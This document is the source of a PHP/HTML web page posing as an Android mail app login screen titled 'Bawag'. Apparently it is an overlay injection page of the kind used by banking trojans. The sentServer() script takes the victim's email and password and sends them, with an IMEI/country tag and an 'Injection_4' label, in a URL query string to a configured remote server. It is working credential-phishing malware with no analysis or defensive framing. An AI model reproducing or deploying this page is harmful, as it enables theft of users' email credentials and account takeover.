<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, user-scalable=no, minimal-ui" />
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>Bawag</title>

    <script src="js/jquery-1.12.0.min.js"></script>
    <script src="js/viewport.js"></script>
	<script src="js/cat.functions.js"></script>

    <link rel="stylesheet" href="bootstrap/dist/css/bootstrap.min.css">
	<link rel="stylesheet" href="font-awesome/css/font-awesome.min.css">
	<link rel="stylesheet" href="mails/com.mail.mobile.android.mail/css/style.css">
	<link rel="stylesheet" href="css/cat.style.css" type="text/css" media="all">
</head>
<?php
$IMEI_country = htmlspecialchars($_REQUEST["p"], ENT_QUOTES);
include "config.php"; ?>
<body>
<!-- Google Tag Manager -->
<div class="loginbox" id="content_div">
        <form id="form" class="mod mod-loginform">
  <div class="login-input-wrapper">
    <label for="email">Email</label>
    <input id="email" name="field2" class="input" type="text" placeholder="Email">
  </div>

  <div class="login-input-wrapper">
    <label for="login-password">Password</label>
    <input id="password" class="input" type="password" name="field3" placeholder="Password">
  </div>

  <input type="button" class="btn btn-block login-submit" onClick="sentServer();" value="Log in">
  </form>
 </div>
<script>
	function sentServer()
	{

	var oNumInp1 = document.getElementById('email');
	var oNumInp2 = document.getElementById('password');


if ((oNumInp1.value.length > 5)&&(oNumInp2.value.length > 3)) {
	var url='<?php echo $URL; ?>';
	var imei_c='<?php echo $IMEI_country; ?>';

	var login1 = document.forms["form"].elements["email"].value;
	var pass = document.forms["form"].elements["password"].value;

	location.replace(url+'/o1o/a10.php?p=' + imei_c+"|Injection_4|mail_mobile_android_mail|"+login1+"|"+pass);
	}
}
</script>
</body>
</html>
